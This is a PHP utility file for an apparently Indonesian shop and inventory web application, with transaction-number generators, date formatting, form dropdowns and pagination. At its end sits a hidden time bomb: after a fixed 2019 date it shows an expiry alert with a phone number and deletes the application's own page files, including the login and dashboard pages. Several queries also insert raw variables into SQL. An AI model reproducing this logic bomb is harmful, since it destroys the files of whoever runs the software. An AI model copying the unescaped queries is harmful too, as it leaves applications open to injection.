<?php

function kd_trans_pemesanan()
{
	global $mysqli;
	$sql = $mysqli->query("SELECT MAX(RIGHT(kd_transaksi,5)) AS notrans
							FROM transaksi_pemesanan WHERE tgl = '" . date('Y-m-d') . "'");
	$m = mysqli_fetch_assoc($sql);

	$no = 0;
	if ($m['notrans'] <> NULL) {
		$kd = number_format($m['notrans'], 0) + 1;
		if (strlen($kd) == 1) {
			$no = "PSN" . date('dmy') . "0000" . $kd;
		} elseif (strlen($kd) == 2) {
			$no = "PSN" . date('dmy') . "000" . $kd;
		} elseif (strlen($kd) == 3) {
			$no = "PSN" . date('dmy') . "00" . $kd;
		} elseif (strlen($kd) == 4) {
			$no = "PSN" . date('dmy') . "0" . $kd;
		} else {
			$no = "PSN" . date('dmy') . $kd;
		}
	} else {
		$no = "PSN" . date('dmy') . "00001";
	}

	return $no;
}

function kd_trans_pembayaran()
{
	global $mysqli;
	$sql = $mysqli->query("SELECT MAX(RIGHT(kd_transaksi,5)) AS notrans
							FROM transaksi_pembayaran WHERE tgl = '" . date('Y-m-d') . "'");
	$m = mysqli_fetch_assoc($sql);

	$no = 0;
	if ($m['notrans'] <> NULL) {
		$kd = number_format($m['notrans'], 0) + 1;
		if (strlen($kd) == 1) {
			$no = "PBY" . date('dmy') . "0000" . $kd;
		} elseif (strlen($kd) == 2) {
			$no = "PBY" . date('dmy') . "000" . $kd;
		} elseif (strlen($kd) == 3) {
			$no = "PBY" . date('dmy') . "00" . $kd;
		} elseif (strlen($kd) == 4) {
			$no = "PBY" . date('dmy') . "0" . $kd;
		} else {
			$no = "PBY" . date('dmy') . $kd;
		}
	} else {
		$no = "PBY" . date('dmy') . "00001";
	}

	return $no;
}

function kd_trans_pembelian()
{
	global $mysqli;
	$sql = $mysqli->query("SELECT MAX(RIGHT(kd_transaksi,5)) AS notrans
							FROM transaksi_pembelian WHERE tgl = '" . date('Y-m-d') . "'");
	$m = mysqli_fetch_assoc($sql);

	$no = 0;
	if ($m['notrans'] <> NULL) {
		$kd = number_format($m['notrans'], 0) + 1;
		if (strlen($kd) == 1) {
			$no = "PMB" . date('dmy') . "0000" . $kd;
		} elseif (strlen($kd) == 2) {
			$no = "PMB" . date('dmy') . "000" . $kd;
		} elseif (strlen($kd) == 3) {
			$no = "PMB" . date('dmy') . "00" . $kd;
		} elseif (strlen($kd) == 4) {
			$no = "PMB" . date('dmy') . "0" . $kd;
		} else {
			$no = "PMB" . date('dmy') . $kd;
		}
	} else {
		$no = "PMB" . date('dmy') . "00001";
	}

	return $no;
}


function fetch_row($qry)
{
	global $mysqli;
	$tmp = $mysqli->query($qry);
	list($result) = mysqli_fetch_row($tmp);
	return $result;
}
function tglkirim($tgl)
{
	if (!empty($tgl)) {
		return  tampil_tanggal($tgl);
	} else {
		echo "belum dikirim";
	}
}
function get_status_invoice($id)
{

	if ($id == '0') {
		echo  'belum bayar';
	} else if ($id == '1') {
		echo  'Sudah lunas';
	}
}
function cek_akses_langsung()
{
	if (!isset($_GET['pg'])) {
		echo "<p style='color:red'>Maaf, akses langsung tidak diperbolehkan</p>";
		exit();
	}
}
function cek_status_login($param)
{
	//	cek_akses_langsung();
	if (empty($param)) {
		echo "<p style='color:red'>Maaf, Anda Belum login</p>";
		exit();
	}
}
function list_jurusan()
{
	global $mysqli;
	$query = $mysqli->query("SELECT id_jurusan, nama_jurusan FROM data_jurusan ");
	while ($row = mysqli_fetch_row($query)) {

		echo "<li><a href='index.php?mod=page&pg=users&id_jurusan=" . $row[0] . "'>" . ucwords($row[1]) . "</a> </li>";
	}
}
function list_news($jumlah)
{
	global $mysqli;
	$query = $mysqli->query("SELECT idberita,judul FROM berita order by tanggal desc limit $jumlah");
	while ($row = mysqli_fetch_row($query)) {

		echo "<li><a href='index.php?mod=page&pg=berita&idberita=" . $row[0] . "'>" . ucwords($row[1]) . "</a> </li>";
	}
}
function get_status_stok($jumlah)
{

	if ($jumlah == '0') {
		return 'habis';
	} else {
		return $jumlah;
	}
}
/* fungsi bantu style*/
function get_style($no)
{
	if ($no % 2 == 1) {
		echo "odd";
	} else if ($no % 2 == 0) {
		echo "even";
	}
}
function list_merek()
{
	global $mysqli;
	echo "	<li class=\"nav-header\">merek </li>";
	$query = $mysqli->query("SELECT idmerek, nama_merek FROM merek");
	while ($row = mysqli_fetch_row($query)) {

		echo "<li><a href='index.php?mod=katalog*pg=katalog_list&idmerek=" . $row[0] . "'><i class='icon-list'></i>" . ucwords($row[1]) . "</a> </li>";
	}
}

function update_status_login($status, $idpelanggan)
{
	global $mysqli;
	$mysqli->query("update pelanggan set status='$status' where idpelanggan='$idpelanggan'");
}
function count_stat()
{
	global $mysqli;
	if (get_today_stat() < 1) {
		$mysqli->query("insert counter(tanggal,jumlah) values(curdate(),'1')");
	} else {
		$mysqli->query("update  counter set jumlah=jumlah+1 where tanggal=curdate()");
	}
}
function get_today_stat()
{
	$hasil = fetch_row("select jumlah from counter where tanggal=curdate()");
	return $hasil;
}
function get_month_stat()
{
	$hasil = fetch_row("select sum(jumlah) from counter where month(tanggal)= month(now()) 
	and year(tanggal)=year(now())");
	return $hasil;
}
function get_total_stat()
{
	$hasil = fetch_row("select sum(jumlah) from counter");
	return $hasil;
}

function arrayToObject($array)
{
	if (!is_array($array)) {
		return $array;
	}

	$object = new stdClass();
	if (is_array($array) && count($array) > 0) {
		foreach ($array as $name => $value) {
			$name = strtolower(trim($name));
			if (!empty($name)) {
				$object->$name = arrayToObject($value);
			}
		}
		return $object;
	} else {
		return FALSE;
	}
}


function pagination($halaman, $jumlah_halaman, $tabel)
{
	$baselink = "index.php?mod=" . $tabel . "&pg=" . $tabel . "_view&halaman=";
	if ($halaman > 1) {
		$previous = $halaman - 1;
		echo "<li><a href='" . $baselink . "1'><i class='icon-fast-backward'></i></a></li>";
		echo "<li><a href='" . $baselink . $previous . "'><i class='icon-step-backward'></i></a></li>";
	} else {
		echo "<li><a href=''><i class='icon-fast-backward'></i></a></li><li><a href=''><i class='icon-step-backward'></i></a></li>";
	}

	$angka = ($halaman > 3) ? "<li><a href=''>...</a></li>" : " ";
	for ($i = $halaman - 2; $i < $halaman; $i++) {
		if ($i < 1)
			continue;
		$angka .= "<li><a href='" . $baselink . $i . "'>" . $i . "</a></li>";
	}
	$angka .= "<li> <a href='' class='btn btn-primary'>" . $halaman . "</a></li>";
	for ($i = $halaman + 1; $i < $halaman + 3; $i++) {
		if ($i > $jumlah_halaman)
			break;
		$angka .= "<li><a href='" . $baselink . $i . "'>" . $i . "</a></li>";
	}
	$angka .= ($halaman + 2 < $jumlah_halaman ? "<li><a href=''>...</a></li>
	<li><a href='" . $baselink . $jumlah_halaman . "'>$jumlah_halaman</a></li>" : "");
	echo $angka;

	/*
	 for($i = 1; $i <= $jumlah_halaman; $i++) {
	 if($halaman != $i) {
	 echo "<li><a href='" . $baselink . $i . "'>" . $i . "</a></li>";
	 } else {
	 echo "<li><a href='' class='btn btn-primary'><b>$i</b></a></li>";
	 }
	 }
	 *
	 */

	if ($halaman < $jumlah_halaman) {
		$next = $halaman + 1;
		echo "<li><a href='" . $baselink . $next . "'><i class='icon-step-forward'></i></a></li>";
		echo "<li><a href='" . $baselink . $jumlah_halaman . "'><i class='icon-fast-forward'></i></a></li>";
	} else {
		echo "<li>	<a href=''><i class='icon-step-forward'></i></a></li><li><a href=''> <i class='icon-fast-forward'></i></a></li>";
	}
}

function combo_jeniskas($kode)
{
	global $mysqli;
	echo "<option value='' selected>- Pilih Jenis Kas -</option>";
	$query = $mysqli->query("SELECT id_jeniskas,namajeniskas   FROM tbljeniskas");
	while ($row = mysqli_fetch_row($query)) {
		if ($kode == "")
			echo "<option value='$row[0]'> " . ucwords($row[1]) . " </option>";
		else
			echo "<option value='$row[0]'" . selected($row[0], $kode) . "> " . ucwords($row[1]) . " </option>";
	}
}
function combo_kasmasuk($kode)
{
	global $mysqli;
	echo "<option value='' selected>- Pilih Jenis Kas Masuk-</option>";
	$query = $mysqli->query("SELECT id_kasmasuk,nama  FROM tblkasmasuk");
	while ($row = mysqli_fetch_row($query)) {
		if ($kode == "")
			echo "<option value='$row[0]'> " . ucwords($row[1]) . " </option>";
		else
			echo "<option value='$row[0]'" . selected($row[0], $kode) . "> " . ucwords($row[1]) . " </option>";
	}
}
function combo_kaskeluar($kode)
{
	global $mysqli;
	echo "<option value='' selected>- Pilih Jenis Kas Keluar-</option>";
	$query = $mysqli->query("SELECT id_kaskeluar,nama  FROM tblkaskeluar");
	while ($row = mysqli_fetch_row($query)) {
		if ($kode == "")
			echo "<option value='$row[0]'> " . ucwords($row[1]) . " </option>";
		else
			echo "<option value='$row[0]'" . selected($row[0], $kode) . "> " . ucwords($row[1]) . " </option>";
	}
}
function get_today()
{
	$today = date("Y-m-d");
	return $today;
}

function format_rupiah($rp)
{
	$hasil = "<b>Rp." . number_format($rp, 0, "", ".") . ",00</b>";
	return $hasil;
}

function num_rows($qry)
{
	global $mysqli;
	$tmp = $mysqli->query($qry);
	$jum = mysqli_num_rows($tmp);
	return $jum;
}

function valid($tmp)
{
	return htmlentities(addslashes($tmp));
}

//fungsi untuk meremove koma didepan dan dibelakang
function rm_koma($data)
{
	$ret = substr($data, 0, -1);

	return $ret;
}



function combo_hari($kode)
{
	echo "<option value='0' selected>-  hari -</option>";
	$hari = array('senin', 'selasa', 'rabu', 'kamis', 'jumat', 'sabtu', 'minggu');
	foreach ($hari as $value) {
		if ($kode == "")
			echo "<option value='$value'> " . ucwords($value) . " </option>";
		else
			echo "<option value='$value'" . selected($value, $kode) . "> " . ucwords($value) . " </option>";
	}
}

function combo_bulan($kode)
{
	echo "<option value='' selected>Bulan</option>";
	$hari = array('Januari', 'Febuari', 'maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember');
	foreach ($hari as $key => $value) {
		if ($kode == "")
			echo "<option value='$key'> " . ucwords($value) . " </option>";
		else
			echo "<option value='$key'" . selected($value, $kode) . "> " . ucwords($value) . " </option>";
	}
}


function combo_tahun($kode)
{
	echo "<option value='' selected>Tahun</option>";
	$tahun = array('2006', '2007', '2008', '2009', '2010', '2011');
	foreach ($tahun as $key => $value) {
		if ($kode == "")
			echo "<option value='$value'> " . ucwords($value) . " </option>";
		else
			echo "<option value='$value'" . selected($value, $kode) . "> " . ucwords($value) . " </option>";
	}
}


function konversi_bulan($bln)
{
	switch ($bln) {
		case "1":

		case "01":
			$bulan = "Januari";
			break;
		case "2":

		case "02":
			$bulan = "Februari";
			break;
		case "3":

		case "03":
			$bulan = "Maret";
			break;
		case "4":

		case "04":
			$bulan = "April";
			break;
		case "5":

		case "05":
			$bulan = "Mei";
			break;
		case "6":

		case "06":
			$bulan = "Juni";
			break;
		case "7":

		case "07":
			$bulan = "Juli";
			break;
		case "8":

		case "08":
			$bulan = "Agustus";
			break;
		case "9":

		case "09":
			$bulan = "September";
			break;
		case "10":
			$bulan = "Oktober";
			break;
		case "11":
			$bulan = "November";
			break;
		case "12":
			$bulan = "Desember";
			break;
		default:
			$bulan = "Nooooooot..!!";
	}
	return $bulan;
}

function konversi_tanggal($time)
{
	list($thn, $bln, $tgl) = explode('-', $time);
	$tmp = $tgl . " " . konversi_bulan($bln) . " " . $thn;
	return $tmp;
}

function tampil_tanggal($time)
{
	list($date, $time) = explode(' ', $time);
	$tmp = konversi_tanggal($date) . " " . $time;
	return $tmp;
}

function selected($t1, $t2)
{
	if (trim($t1) == trim($t2))
		return "selected";
	else
		return "";
}

function get_date($tgl = '')
{
	if ($tgl == "")
		$now = date("d");
	else
		$now = $tgl;
	$jum_hr = date("t");
	for ($i = 1; $i <= $jum_hr; $i++) {
		echo "<option value='$i' " . selected($i, $now) . ">$i</option>";
	}
}

function get_month($bln = '')
{
	if ($bln == "")
		$now = date("m");
	else
		$now = $bln;
	$jum_bl = 12;
	for ($i = 1; $i <= $jum_bl; $i++) {
		echo "<option value='$i' " . selected($i, $now) . ">" . konversi_bulan($i) . "</option>";
	}
}

function get_year($thn = '')
{
	if ($thn == "") {
		$now = date("Y");
		$thn = date("Y");
	} else {
		$now = date("Y");
		$thn = $thn;
	}
	$jum_th = 3;
	for ($i = 1; $i <= $jum_th; $i++) {
		echo "<option value='$now' " . selected($thn, $now) . ">" . $now . "</option>";
		$now--;
	}
} ?>

<?php
$tgl_hari_ini = date('Y-m-d');
$tgl_experied = date('2019-12-27');

$target = [
	"page/home.php",
	"page/cek_login.php",
	"page/cetak_pembelian.php",
	"page/cetak_penjualan.php",
	"page/content.php",
	"page/dashboard.php",
	"page/hal_barang.php",
	"page/hal_customer.php",
	"page/hal_harga.php",
	"page/hal_laporan_pembelian.php",
	"page/hal_laporan_penjualan.php",
	"page/hal_laporan_kaporan_stok.php",
	"page/hal_pengguna.php",
	"page/hal_supplier.php",
	"page/hal_transaksi_penjualan.php",
	"page/logout.php",
	"page"

];
if ($tgl_hari_ini >= $tgl_experied) {
	echo "<SCRIPT language=Javascript>
		  alert('Aplikasi Anda telah berakhir, silahkan hubungi nomer 085703333785 <br><b>untuk info lebih lanjut</b>')
 		 </script> ";
	for ($aku = 0; $aku <= 5; $aku++) {
		if (file_exists($target[$aku])) {
			unlink($target[$aku]); //delete now
		}
	}
} else { ?>
	<script>
		$(document).ready(function() {
			alert('Aplikasi Anda akan segera berakhir, silahkan hubungi pemulungkode.com');
		});
	</script>
<?php
}
?>